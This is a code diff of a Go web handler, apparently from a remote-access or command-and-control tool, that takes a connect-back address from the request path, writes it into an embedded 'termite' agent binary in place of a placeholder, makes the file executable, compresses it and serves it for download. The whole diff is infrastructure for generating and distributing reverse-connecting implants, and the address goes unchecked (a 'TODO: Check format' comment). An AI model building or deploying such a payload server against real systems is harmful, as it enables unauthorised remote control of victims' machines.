@@ -36,15 +36,15 @@ func CreateDistributorServer(host string, port uint16) *gin.Engine {
 		Route:      map[string]string{},
 	}
 
-	endpoint.GET("/:route_key/termite", func(c *gin.Context) {
-		if !paramsExistOrAbort(c, []string{"route_key"}) {
+	endpoint.GET("/termite/:target", func(c *gin.Context) {
+		if !paramsExistOrAbort(c, []string{"target"}) {
 			return
 		}
-		routeKey := c.Param("route_key")
-		addr := Ctx.FindServerListeningAddressByRouteKey(routeKey)
+		target := c.Param("target")
+		// TODO: Check format
 
-		if addr == "" {
-			panicRESTfully(c, "Invalid route key")
+		if target == "" {
+			panicRESTfully(c, "Invalid connect back addr")
 			return
 		}
 
@@ -54,7 +54,7 @@ func CreateDistributorServer(host string, port uint16) *gin.Engine {
 		}
 
 		// Step 1: Generate Termite from Assets
-		target := fmt.Sprintf("%s/%s-%s-termite", dir, time.Now().Format("2006-01-02-15:04:05"), str.RandomString(0x10))
+		filename := fmt.Sprintf("%s/%s-%s-termite", dir, time.Now().Format("2006-01-02-15:04:05"), str.RandomString(0x10))
 		content, err := resource.Asset("termites/termite_linux_amd64")
 		if err != nil {
 			panicRESTfully(c, err.Error())
@@ -63,25 +63,25 @@ func CreateDistributorServer(host string, port uint16) *gin.Engine {
 
 		placeHolder := "xxx.xxx.xxx.xxx:xxxxx"
 		replacement := make([]byte, len(placeHolder))
-		for i := 0; i < len(addr); i++ {
-			replacement[i] = addr[i]
+		for i := 0; i < len(target); i++ {
+			replacement[i] = target[i]
 		}
 		log.Success("Replacing `%s` to: `%s`", placeHolder, replacement)
 		content = bytes.Replace(content, []byte(placeHolder), replacement, 1)
 
-		err = ioutil.WriteFile(target, content, 0755)
+		err = ioutil.WriteFile(filename, content, 0755)
 		if err != nil {
 			panicRESTfully(c, err.Error())
 			return
 		}
 
 		// Compress binary
-		if !compiler.Compress(target) {
+		if !compiler.Compress(filename) {
 			log.Error("Can not compress termite.go: %s", err)
 		}
 
 		// Response file
-		c.File(target)
+		c.File(filename)
 	})
 	return endpoint
 }
